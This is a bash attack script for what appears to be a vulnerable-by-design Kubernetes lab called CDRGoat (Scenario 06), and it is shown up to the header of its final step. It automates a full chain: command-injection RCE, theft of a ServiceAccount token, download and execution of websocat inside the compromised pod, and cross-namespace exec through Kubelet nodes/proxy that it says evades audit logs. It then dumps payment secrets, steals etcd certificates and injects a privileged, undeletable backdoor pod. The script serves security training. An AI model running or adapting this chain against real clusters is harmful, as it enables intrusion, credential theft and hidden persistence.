#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Kubernetes - Scenario 06                ===" "${RESET}"
  printf "%sRCE -> nodes/proxy Audit Bypass -> etcd Direct Injection%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  Step  1.  Exploit RCE to steal ServiceAccount token\n"
  printf "  Step  2.  Enumerate permissions (discover nodes/proxy)\n"
  printf "  Step  3.  Audit-invisible exec via nodes/proxy WebSocket\n"
  printf "  Step  4.  Harvest secrets from kube-system pods\n"
  printf "  Step  5.  (On-prem) Inject persistent pod via etcd\n"
  printf "  Step  6.  Verify results\n"
  printf "\n"
  printf "  ${RED}WARNING: Run this from a dedicated attack VM, not your laptop.${RESET}\n"
  printf "  ${RED}This script downloads and executes third-party binaries.${RESET}\n"
}
banner

NAMESPACE="cdrgoat-sc06"
KUBETCD_BIN=""
ETCD_AVAILABLE=0

#############################################
# Helper: run command via web app RCE
#############################################
rce() {
  curl -sS --connect-timeout 10 --max-time "${RCE_TIMEOUT:-30}" \
    -G "http://${TARGET}/cmd" --data-urlencode "c=$1" 2>/dev/null
}

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq kubectl; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

info "websocat will be installed inside the compromised pod (Step 3)"

#############################################
# kubetcd setup
#############################################
step "kubetcd tool setup"
info "kubetcd is needed for Step 5 (on-prem etcd injection)"
info "Source: https://github.com/nccgroup/kubetcd"
printf "\n"
printf "  1) Download from GitHub (linux/amd64 binary)\n"
printf "  2) Provide path to existing kubetcd binary\n"
printf "  3) Skip (etcd step will be unavailable)\n"
printf "\n"
read -r -p "  Choose [1/2/3]: " KUBETCD_CHOICE

case "$KUBETCD_CHOICE" in
  1)
    KUBETCD_URL="https://github.com/nccgroup/kubetcd/releases/download/v1.28/kubetcd_linux_amd64"
    info "Downloading from: ${KUBETCD_URL}"
    printf "\n  ${RED}WARNING: You are about to download and execute a third-party binary.${RESET}\n"
    printf "  ${RED}Only proceed on a dedicated attack VM / disposable environment.${RESET}\n\n"
    read -r -p "  Confirm download? [y/N]: " CONFIRM_DL
    if [ "${CONFIRM_DL,,}" = "y" ]; then
      curl -sL -o /tmp/kubetcd "$KUBETCD_URL"
      chmod +x /tmp/kubetcd
      KUBETCD_BIN="/tmp/kubetcd"
      ok "kubetcd downloaded to ${KUBETCD_BIN}"
    else
      info "Download cancelled - etcd step will be skipped"
    fi
    ;;
  2)
    read -r -p "  Path to kubetcd binary: " KUBETCD_PATH
    if [ -x "$KUBETCD_PATH" ]; then
      KUBETCD_BIN="$KUBETCD_PATH"
      ok "Using kubetcd at ${KUBETCD_BIN}"
    else
      err "Not found or not executable: $KUBETCD_PATH"
      info "etcd step will be skipped"
    fi
    ;;
  *)
    info "Skipping kubetcd - etcd step will be unavailable"
    ;;
esac

#############################################
# Target identification
#############################################
printf "\n"
step "Target identification"
info "Provide the vulnerable web app URL (LoadBalancer IP/hostname)"
printf "\n"
read -r -p "  Target URL/IP: " TARGET

TARGET="${TARGET#http://}"
TARGET="${TARGET#https://}"
TARGET="${TARGET%/}"

spin_start "Testing connectivity"
set +e
HEALTH=$(curl -sS --connect-timeout 10 "http://${TARGET}/health" 2>/dev/null)
set -e
spin_stop

if [ "$HEALTH" != "OK" ]; then
  err "Cannot reach http://${TARGET}/health"
  exit 1
fi
ok "Target reachable: ${YELLOW}http://${TARGET}${RESET}"

read -r -p "Everything is prepared. Press Enter to start the attack (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Exploit RCE and Steal SA Token
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit RCE and Steal ServiceAccount Token  ===" "${RESET}"

step "Testing command injection on /cmd endpoint"
RCE_TEST=$(rce "id")
if echo "$RCE_TEST" | grep -q "uid="; then
  ok "RCE confirmed!"
  printf "  %s%s%s\n" "$YELLOW" "$RCE_TEST" "$RESET"
else
  err "RCE failed"
  exit 1
fi

step "Identifying pod"
HOSTNAME=$(rce "hostname")
ok "Pod: ${YELLOW}${HOSTNAME}${RESET}"

step "Stealing ServiceAccount token"
SA_TOKEN=$(rce "cat /var/run/secrets/kubernetes.io/serviceaccount/token")
if [ -n "$SA_TOKEN" ] && echo "$SA_TOKEN" | grep -q "^eyJ"; then
  ok "SA token stolen (${#SA_TOKEN} bytes)"
  info "Token preview: ${YELLOW}${SA_TOKEN:0:50}...${RESET}"
else
  err "Failed to read SA token"
  exit 1
fi

SA_NAMESPACE=$(rce "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace")
ok "Namespace: ${YELLOW}${SA_NAMESPACE}${RESET}"

# Get internal K8s API for requests from inside the pod
K8S_HOST=$(rce "printenv KUBERNETES_SERVICE_HOST")
K8S_PORT=$(rce "printenv KUBERNETES_SERVICE_PORT")
K8S_API_INTERNAL="https://${K8S_HOST}:${K8S_PORT}"
ok "K8s API (internal): ${YELLOW}${K8S_API_INTERNAL}${RESET}"

# Discover public API endpoint from SA token JWT for kubectl from attack machine
step "Discovering public K8s API endpoint from SA token"
JWT_PAYLOAD=$(echo "$SA_TOKEN" | cut -d. -f2 | tr '_-' '/+')
MOD=$((${#JWT_PAYLOAD} % 4))
[ $MOD -eq 2 ] && JWT_PAYLOAD="${JWT_PAYLOAD}=="
[ $MOD -eq 3 ] && JWT_PAYLOAD="${JWT_PAYLOAD}="
OIDC_ISSUER=$(echo "$JWT_PAYLOAD" | base64 -d 2>/dev/null | jq -r '.iss // empty' 2>/dev/null)

if echo "$OIDC_ISSUER" | grep -q "eks"; then
  CLUSTER_ID=$(echo "$OIDC_ISSUER" | grep -o '[A-F0-9]\{32\}')
  REGION=$(echo "$OIDC_ISSUER" | grep -o 'us-east-[0-9]\|us-west-[0-9]\|eu-west-[0-9]\|eu-central-[0-9]\|ap-[a-z]*-[0-9]')
  K8S_API="https://${CLUSTER_ID}.yl4.${REGION}.eks.amazonaws.com"
  ok "EKS public endpoint: ${YELLOW}${K8S_API}${RESET}"
else
  K8S_API="$K8S_API_INTERNAL"
  ok "Using internal API: ${YELLOW}${K8S_API}${RESET}"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The web app has command injection on the /cmd endpoint.\n"
printf "We stole the SA token and will use it for K8s API access.\n"
printf "RCE also lets us install tools inside the pod for later steps.\n\n"

read -r -p "Step 1 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Enumerate Permissions - Discover nodes/proxy
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate Permissions  ===" "${RESET}"

# Create a temporary kubeconfig for kubectl commands
TMPKUBECONFIG=$(mktemp)
kubectl config set-cluster target --server="$K8S_API" --insecure-skip-tls-verify=true --kubeconfig="$TMPKUBECONFIG" >/dev/null 2>&1
kubectl config set-credentials attacker --token="$SA_TOKEN" --kubeconfig="$TMPKUBECONFIG" >/dev/null 2>&1
kubectl config set-context attack --cluster=target --user=attacker --kubeconfig="$TMPKUBECONFIG" >/dev/null 2>&1
kubectl config use-context attack --kubeconfig="$TMPKUBECONFIG" >/dev/null 2>&1

step "Checking key permissions with stolen token"
for perm in \
  "get nodes/proxy|get nodes --subresource=proxy" \
  "list nodes|list nodes" \
  "list pods|list pods" \
  "create pods/exec|create pods --subresource=exec"; do
  DESC="${perm%%|*}"
  CHECK="${perm##*|}"
  set +e
  RESULT=$(kubectl auth can-i $CHECK --kubeconfig="$TMPKUBECONFIG" 2>/dev/null)
  set -e
  if [ "$RESULT" = "yes" ]; then
    printf "  %s[OK]%s  %s\n" "$GREEN" "$RESET" "$DESC"
  else
    printf "  %s[NO]%s  %s\n" "$RED" "$RESET" "$DESC"
  fi
done

set +e
CAN_PROXY=$(kubectl auth can-i get nodes --subresource=proxy --kubeconfig="$TMPKUBECONFIG" 2>/dev/null)
set -e
if [ "$CAN_PROXY" = "yes" ]; then
  printf "\n"
  ok "${RED}nodes/proxy GET allowed - audit-invisible exec path available!${RESET}"
  info "pods/exec is DENIED - but nodes/proxy bypasses that check"
else
  err "nodes/proxy not available"
  info "This permission is granted by 69+ Helm charts by default"
fi

step "Listing cluster nodes"
NODES=$(kubectl get nodes --kubeconfig="$TMPKUBECONFIG" -o wide 2>/dev/null)
ok "Nodes:"
echo "$NODES" | while IFS= read -r line; do printf "  %s\n" "$line"; done

ALL_NODE_NAMES=$(kubectl get nodes --kubeconfig="$TMPKUBECONFIG" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null)

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The SA has ${RED}get nodes/proxy${RESET} permission.\n\n"
printf "This is a K8s design decision (not a CVE - upstream marked 'Won't Fix').\n"
printf "GET on nodes/proxy upgrades to a WebSocket connection directly to the\n"
printf "Kubelet on port 10250, bypassing the pods/exec RBAC check entirely.\n\n"
printf "The K8s audit log records this as a ${YELLOW}GET on nodes/proxy${RESET},\n"
printf "NOT as pods/exec. Most SIEM rules only monitor for pods/exec.\n\n"

read -r -p "Step 2 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Audit-Invisible Exec via nodes/proxy
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Audit-Invisible Exec via nodes/proxy  ===" "${RESET}"

step "Locating target pod for cross-namespace exec"
TARGET_EXEC_POD="backend-api"
TARGET_EXEC_NS="cdrgoat-sc06-target"

# Use kubectl (list pods permission) to find which node the target runs on
TARGET_NODE=$(kubectl get pod backend-api -n "$TARGET_EXEC_NS" --kubeconfig="$TMPKUBECONFIG" -o jsonpath='{.spec.nodeName}' 2>/dev/null)
NODE_IP=$(kubectl get node "$TARGET_NODE" --kubeconfig="$TMPKUBECONFIG" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}' 2>/dev/null)

if [ -n "$NODE_IP" ]; then
  ok "Target: ${RED}${TARGET_EXEC_NS}/${TARGET_EXEC_POD}${RESET} on node ${YELLOW}${TARGET_NODE}${RESET}"
  ok "Node IP: ${YELLOW}${NODE_IP}${RESET} (Kubelet:10250 reachable from inside the pod)"
else
  err "Could not locate target pod"
  exit 1
fi

step "Installing websocat inside compromised pod"
info "websocat enables WebSocket exec to Kubelet - the audit bypass"
RCE_TIMEOUT=120
set +e
INSTALL_RESULT=$(rce "python3 -c \"
import urllib.request
url = 'https://github.com/vi/websocat/releases/latest/download/websocat.x86_64-unknown-linux-musl'
urllib.request.urlretrieve(url, '/tmp/websocat')
\" 2>&1 && chmod +x /tmp/websocat && /tmp/websocat --version 2>&1")
set -e
RCE_TIMEOUT=30

if echo "$INSTALL_RESULT" | grep -q "websocat"; then
  ok "websocat installed in pod: $(echo "$INSTALL_RESULT" | grep websocat | head -1)"
else
  err "Failed to install websocat in pod: $INSTALL_RESULT"
  info "Falling back to Python HTTP method"
fi

step "Executing commands in cross-namespace pod via Kubelet WebSocket"
info "This is equivalent to: kubectl exec -n ${TARGET_EXEC_NS} ${TARGET_EXEC_POD} -- <cmd>"
info "But routes through Kubelet:10250 directly - NO pods/exec audit event"
info "The SA has NO pods/exec RBAC - only GET nodes/proxy"

if [ -n "$TARGET_EXEC_POD" ]; then
  CONTAINER_NAME="api"
  info "Target: ${TARGET_EXEC_NS}/${TARGET_EXEC_POD} (container: ${CONTAINER_NAME})"

  # Execute commands via websocat WebSocket to Kubelet
  # For multi-word commands, wrap in /bin/sh -c
  for cmd_entry in \
    "whoami|command=whoami" \
    "hostname|command=hostname" \
    "env|command=env" \
    "cat SA token|command=/bin/sh&command=-c&command=cat+/var/run/secrets/kubernetes.io/serviceaccount/token"; do

    CMD_DESC="${cmd_entry%%|*}"
    CMD_PARAMS="${cmd_entry##*|}"

    set +e
    EXEC_OUT=$(rce "python3 -c \"
import subprocess
token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
url = 'wss://${NODE_IP}:10250/exec/${TARGET_EXEC_NS}/${TARGET_EXEC_POD}/${CONTAINER_NAME}?output=1&error=1&${CMD_PARAMS}'
r = subprocess.run(['/tmp/websocat', '-t', '--no-close', '--insecure', '--protocol', 'v4.channel.k8s.io', url, '-H=Authorization: Bearer ' + token], capture_output=True, timeout=10)
# Strip K8s channel bytes and JSON status
import re
out = r.stdout.replace(b'\\x01', b'').replace(b'\\x02', b'').replace(b'\\x03', b'')
text = out.decode('utf-8', errors='replace')
text = re.sub(r'\\{.*?\\}', '', text).strip()
if text: print(text)
\"" 2>/dev/null)
    set -e

    if [ -n "$EXEC_OUT" ]; then
      ok "${TARGET_EXEC_NS}/${TARGET_EXEC_POD} $ ${CMD_DESC}"
      printf "  %s%s%s\n" "$YELLOW" "$(echo "$EXEC_OUT" | head -5)" "$RESET"
    else
      info "${CMD_DESC}: no output"
    fi
  done
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We executed ${RED}real commands${RESET} inside a pod in a different namespace.\n"
printf "This is identical to 'kubectl exec' but via a different path:\n\n"
printf "  Regular path: kubectl exec -> API server -> pods/exec RBAC check -> Kubelet\n"
printf "  Attack path:  nodes/proxy GET -> API server -> Kubelet:10250 directly\n\n"
printf "The WebSocket handshake uses HTTP GET, so RBAC sees 'get nodes/proxy'\n"
printf "and allows it. The Kubelet executes the command without re-checking RBAC.\n\n"
printf "What appeared in the K8s audit log:\n"
printf "  ${GREEN}Recorded:${RESET}  verb=GET, resource=nodes/proxy\n"
printf "  ${RED}NOT recorded:${RESET} pods/exec, the commands we ran, or which pod\n\n"

read -r -p "Step 3 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Use Stolen SA Token to Access K8s Secrets
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Use Stolen SA Token to Access K8s Secrets  ===" "${RESET}"

step "Decoding stolen SA token from target pod"
info "Token stolen via nodes/proxy exec in Step 3"

# Extract the token from the env output (or use the directly stolen one)
STOLEN_TOKEN=""
if [ -n "$EXEC_OUT" ] && echo "$EXEC_OUT" | grep -q "^eyJ"; then
  STOLEN_TOKEN=$(echo "$EXEC_OUT" | grep "^eyJ" | head -1 | tr -d '[:space:]' | sed 's/,"status.*//;s/}.*/}/')
fi

if [ -n "$STOLEN_TOKEN" ]; then
  # Decode JWT to see what SA it belongs to
  JWT_P=$(echo "$STOLEN_TOKEN" | cut -d. -f2 | tr '_-' '/+')
  MOD=$((${#JWT_P} % 4))
  [ $MOD -eq 2 ] && JWT_P="${JWT_P}=="
  [ $MOD -eq 3 ] && JWT_P="${JWT_P}="
  JWT_SA=$(echo "$JWT_P" | base64 -d 2>/dev/null | jq -r '.sub // empty' 2>/dev/null)
  JWT_NS=$(echo "$JWT_P" | base64 -d 2>/dev/null | jq -r '.["kubernetes.io"].namespace // empty' 2>/dev/null)
  ok "Stolen token belongs to: ${RED}${JWT_SA}${RESET}"
  info "Namespace: ${JWT_NS}"

  step "Using stolen token to access K8s secrets"
  # Create a temp kubeconfig with the stolen token
  STOLEN_KUBECONFIG=$(mktemp)
  kubectl config set-cluster stolen --server="$K8S_API" --insecure-skip-tls-verify=true --kubeconfig="$STOLEN_KUBECONFIG" >/dev/null 2>&1
  kubectl config set-credentials stolen-sa --token="$STOLEN_TOKEN" --kubeconfig="$STOLEN_KUBECONFIG" >/dev/null 2>&1
  kubectl config set-context stolen --cluster=stolen --user=stolen-sa --kubeconfig="$STOLEN_KUBECONFIG" >/dev/null 2>&1
  kubectl config use-context stolen --kubeconfig="$STOLEN_KUBECONFIG" >/dev/null 2>&1

  # Check if the stolen SA can read secrets
  set +e
  CAN_SECRETS=$(kubectl auth can-i list secrets -n "$TARGET_EXEC_NS" --kubeconfig="$STOLEN_KUBECONFIG" 2>/dev/null)
  set -e

  if [ "$CAN_SECRETS" = "yes" ]; then
    ok "Stolen SA can read secrets in ${TARGET_EXEC_NS}!"

    step "Listing secrets in target namespace"
    SECRETS_LIST=$(kubectl get secrets -n "$TARGET_EXEC_NS" --kubeconfig="$STOLEN_KUBECONFIG" -o json 2>/dev/null | \
      jq -r '.items[] | select(.type != "kubernetes.io/service-account-token") | "\(.metadata.name) [\(.type)]"' 2>/dev/null)
    if [ -n "$SECRETS_LIST" ]; then
      ok "Secrets found:"
      echo "$SECRETS_LIST" | while IFS= read -r line; do printf "  %s%s%s\n" "$RED" "$line" "$RESET"; done
    fi

    step "Dumping payment gateway secret"
    PAYMENT_SECRET=$(kubectl get secret payment-gateway-keys -n "$TARGET_EXEC_NS" --kubeconfig="$STOLEN_KUBECONFIG" -o json 2>/dev/null)
    if [ -n "$PAYMENT_SECRET" ]; then
      PAY_KEY=$(echo "$PAYMENT_SECRET" | jq -r '.data.PAYMENT_API_KEY // empty' 2>/dev/null | base64 -d 2>/dev/null)
      PAY_SECRET=$(echo "$PAYMENT_SECRET" | jq -r '.data.PAYMENT_SECRET // empty' 2>/dev/null | base64 -d 2>/dev/null)
      WEBHOOK=$(echo "$PAYMENT_SECRET" | jq -r '.data.WEBHOOK_SECRET // empty' 2>/dev/null | base64 -d 2>/dev/null)
      if [ -n "$PAY_KEY" ]; then
        printf "\n%s%s%s\n" "${BOLD}${RED}" "STOLEN PAYMENT CREDENTIALS (via stolen SA token)" "${RESET}"
        printf "%s\n" "---------------------------------------------------------------------"
        printf "  API Key        : %s%s%s\n" "$YELLOW" "$PAY_KEY" "$RESET"
        printf "  Secret         : %s%s%s\n" "$RED" "$PAY_SECRET" "$RESET"
        printf "  Webhook Secret : %s%s%s\n" "$RED" "$WEBHOOK" "$RESET"
        printf "%s\n" "---------------------------------------------------------------------"
      fi
    fi
  else
    info "Stolen SA has no secret read permissions"
  fi

  rm -f "$STOLEN_KUBECONFIG"
else
  info "SA token not captured cleanly from exec output"
  info "In a real attack, the attacker would read the token file directly"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We stole the target pod's SA token via nodes/proxy exec.\n"
printf "This token can be used to access K8s resources as that pod's identity.\n\n"
printf "Combined with the env vars stolen in Step 3:\n"
printf "  ${RED}DB_PASSWORD${RESET}, ${RED}API_SECRET${RESET} - application secrets\n"
printf "  ${RED}SA token${RESET} - K8s identity for further API access\n\n"
printf "All obtained without any pods/exec audit event.\n\n"

read -r -p "Step 4 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. (On-prem) Steal etcd Certs + Inject Persistent Pod
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. etcd Cert Theft + Direct Injection (On-prem Only)  ===" "${RESET}"

step "Detecting cluster type"
info "Looking for control plane nodes"

# Check for control plane nodes (only exist on on-prem/kubeadm clusters)
set +e
CP_NODE=$(kubectl get nodes --kubeconfig="$TMPKUBECONFIG" -l node-role.kubernetes.io/control-plane -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
[ -z "$CP_NODE" ] && CP_NODE=$(kubectl get nodes --kubeconfig="$TMPKUBECONFIG" -l node-role.kubernetes.io/master -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
set -e

if [ -n "$CP_NODE" ]; then
  ok "Control plane node found: ${RED}${CP_NODE}${RESET}"
  ETCD_AVAILABLE=1

  CP_NODE_IP=$(kubectl get node "$CP_NODE" --kubeconfig="$TMPKUBECONFIG" -o jsonpath='{.status.addresses[?(@.type=="InternalIP")].address}' 2>/dev/null)
  ok "Control plane IP: ${YELLOW}${CP_NODE_IP}${RESET}"

  # Step 5a: Find kube-apiserver pod on control plane (it mounts etcd certs)
  step "Finding kube-apiserver pod on control plane"
  info "kube-apiserver mounts etcd certs at /etc/kubernetes/pki/etcd/"

  set +e
  CP_PODS_JSON=$(rce "python3 -c \"
import urllib.request, ssl
token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
req = urllib.request.Request('${K8S_API_INTERNAL}/api/v1/nodes/${CP_NODE}/proxy/pods', headers={'Authorization': 'Bearer ' + token})
print(urllib.request.urlopen(req, context=ctx).read().decode())
\"")
  APISERVER_POD=$(echo "$CP_PODS_JSON" | jq -r '.items[]? | select(.metadata.name | startswith("kube-apiserver")) | .metadata.name' 2>/dev/null | head -1)
  set -e

  if [ -n "$APISERVER_POD" ]; then
    ok "kube-apiserver pod: ${RED}${APISERVER_POD}${RESET}"

    # Step 5b: Exec into kube-apiserver via Kubelet to steal etcd certs
    step "Stealing etcd certificates via Kubelet exec (nodes/proxy)"
    info "Using the same audit-invisible technique from Step 3"

    ETCD_CERT_DIR="/tmp/etcd-certs"
    mkdir -p "$ETCD_CERT_DIR"

    for cert_file in "ca.crt" "server.crt" "server.key"; do
      CERT_CMD="command=/bin/sh&command=-c&command=cat+/etc/kubernetes/pki/etcd/${cert_file}"
      set +e
      CERT_DATA=$(rce "python3 -c \"
import subprocess
token = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
url = 'wss://${CP_NODE_IP}:10250/exec/kube-system/${APISERVER_POD}/kube-apiserver?output=1&error=1&${CERT_CMD}'
r = subprocess.run(['/tmp/websocat', '-t', '--no-close', '--insecure', '--protocol', 'v4.channel.k8s.io', url, '-H=Authorization: Bearer ' + token], capture_output=True, timeout=10)
import re
out = r.stdout.replace(b'\\x01', b'').replace(b'\\x02', b'').replace(b'\\x03', b'')
text = out.decode('utf-8', errors='replace')
text = re.sub(r'\\{.*?\\}', '', text).strip()
if text: print(text)
\"" 2>/dev/null)
      set -e

      if [ -n "$CERT_DATA" ] && echo "$CERT_DATA" | grep -q "BEGIN\|KEY"; then
        echo "$CERT_DATA" > "${ETCD_CERT_DIR}/${cert_file}"
        ok "Stolen: ${cert_file} ($(wc -c < "${ETCD_CERT_DIR}/${cert_file}" | tr -d ' ') bytes)"
      else
        err "Failed to steal ${cert_file}"
      fi
    done

    # Step 5c: Use kubetcd with stolen certs to inject pod
    if [ -f "${ETCD_CERT_DIR}/ca.crt" ] && [ -f "${ETCD_CERT_DIR}/server.crt" ] && [ -f "${ETCD_CERT_DIR}/server.key" ] && [ -n "$KUBETCD_BIN" ]; then
      ok "All etcd certificates stolen via nodes/proxy exec!"

      # Get etcd endpoint from kube-apiserver command line
      step "Discovering etcd endpoint"
      set +e
      ETCD_ENDPOINT=$(echo "$CP_PODS_JSON" | jq -r '.items[]? | select(.metadata.name | startswith("kube-apiserver")) | .spec.containers[0].command[]' 2>/dev/null | grep "etcd-servers" | sed 's/.*=//;s|https://||;s|,.*||')
      set -e
      [ -z "$ETCD_ENDPOINT" ] && ETCD_ENDPOINT="${CP_NODE_IP}:2379"
      ok "etcd endpoint: ${YELLOW}${ETCD_ENDPOINT}${RESET}"

      step "Listing pods directly from etcd (bypassing API server)"
      set +e
      ETCD_PODS=$("$KUBETCD_BIN" get pods \
        --endpoint "$ETCD_ENDPOINT" \
        --cacert "${ETCD_CERT_DIR}/ca.crt" \
        --cert "${ETCD_CERT_DIR}/server.crt" \
        --key "${ETCD_CERT_DIR}/server.key" 2>/dev/null)
      set -e

      if [ -n "$ETCD_PODS" ]; then
        ok "Pods read directly from etcd:"
        echo "$ETCD_PODS" | head -10 | while IFS= read -r line; do printf "  %s\n" "$line"; done
      fi

      TEMPLATE_POD=$(kubectl get pods -n kube-system --kubeconfig="$TMPKUBECONFIG" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)

      if [ -n "$TEMPLATE_POD" ]; then
        step "Injecting persistent pod via etcd"
        info "Template: ${YELLOW}${TEMPLATE_POD}${RESET}"
        info "Creating privileged pod with fake namespace path"

        set +e
        INJECT_RESULT=$("$KUBETCD_BIN" create pod cdrgoat-backdoor \
          -t "$TEMPLATE_POD" \
          -n kube-system \
          -i "alpine:3.19" \
          --privileged \
          --persistence "kube-system/cdrgoat-sys-monitor" \
          --node "$CP_NODE" \
          --endpoint "$ETCD_ENDPOINT" \
          --cacert "${ETCD_CERT_DIR}/ca.crt" \
          --cert "${ETCD_CERT_DIR}/server.crt" \
          --key "${ETCD_CERT_DIR}/server.key" 2>&1)
        INJECT_RC=$?
        set -e

        if [ $INJECT_RC -eq 0 ]; then
          ok "${RED}Pod injected directly into etcd!${RESET}"
          printf "  Name: cdrgoat-backdoor\n"
          printf "  Namespace: kube-system\n"
          printf "  Persistence: fake path (kubectl delete won't work)\n"
          printf "  Privileged: yes (hostPID, hostNetwork, hostIPC)\n"

          step "Verifying injected pod appears in kubectl"
          sleep 3
          set +e
          VERIFY=$(kubectl get pod cdrgoat-backdoor -n kube-system --kubeconfig="$TMPKUBECONFIG" 2>/dev/null)
          set -e
          if [ -n "$VERIFY" ]; then
            ok "Pod visible in kubectl get pods:"
            printf "  %s\n" "$VERIFY"
            info "But there is NO creation event in the K8s audit log"
            info "And kubectl delete will fail (etcd key path mismatch)"
          fi
        else
          err "etcd injection failed: $INJECT_RESULT"
        fi
      fi

      rm -rf "$ETCD_CERT_DIR"
    elif [ -z "$KUBETCD_BIN" ]; then
      info "kubetcd not configured - skipping injection step"
      info "Certs were stolen, re-run with kubetcd to complete the injection"
    fi
  else
    info "kube-apiserver pod not found on control plane node"
    info "The pod may be running as a static pod or the node uses a different layout"
  fi
else
  info "No control plane nodes found (managed K8s detected)"
  info "On EKS/GKE/AKS, the control plane is provider-managed"
  printf "\n"
  info "On an on-prem cluster, the attacker would:"
  printf "  1. Find control plane node (label: node-role.kubernetes.io/control-plane)\n"
  printf "  2. Exec into kube-apiserver pod via Kubelet WebSocket (same technique as Step 3)\n"
  printf "  3. Steal etcd certs from /etc/kubernetes/pki/etcd/ (ca.crt, server.crt, server.key)\n"
  printf "  4. Use kubetcd to inject a privileged pod directly into etcd\n"
  printf "  5. The pod appears in 'kubectl get pods' but has:\n"
  printf "     - ${RED}No creation event in K8s audit log${RESET}\n"
  printf "     - ${RED}Bypasses all admission controllers${RESET} (PSA, OPA, Kyverno)\n"
  printf "     - ${RED}Cannot be deleted via kubectl${RESET} (fake namespace path)\n"
  ETCD_AVAILABLE=0
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "On on-prem clusters, the attacker chains the nodes/proxy bypass twice:\n"
printf "  1. Exec into ${RED}kube-apiserver${RESET} pod via Kubelet WebSocket\n"
printf "  2. Steal etcd certs from /etc/kubernetes/pki/etcd/\n"
printf "  3. Use kubetcd to inject a pod directly into etcd\n\n"
printf "The injected pod has:\n"
printf "  ${RED}Zero API audit log entries${RESET} (API server never sees the request)\n"
printf "  ${RED}Bypasses ALL admission controllers${RESET} (PSA, OPA, Kyverno)\n"
printf "  ${RED}Persistence via fake namespace path${RESET} (kubectl delete fails)\n\n"
printf "On managed K8s (EKS/GKE/AKS), this is blocked:\n"
printf "  No control plane nodes visible, no kube-apiserver pod, etcd is managed.\n\n"

read -r -p "Step 5 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Verify Results
################################################################################
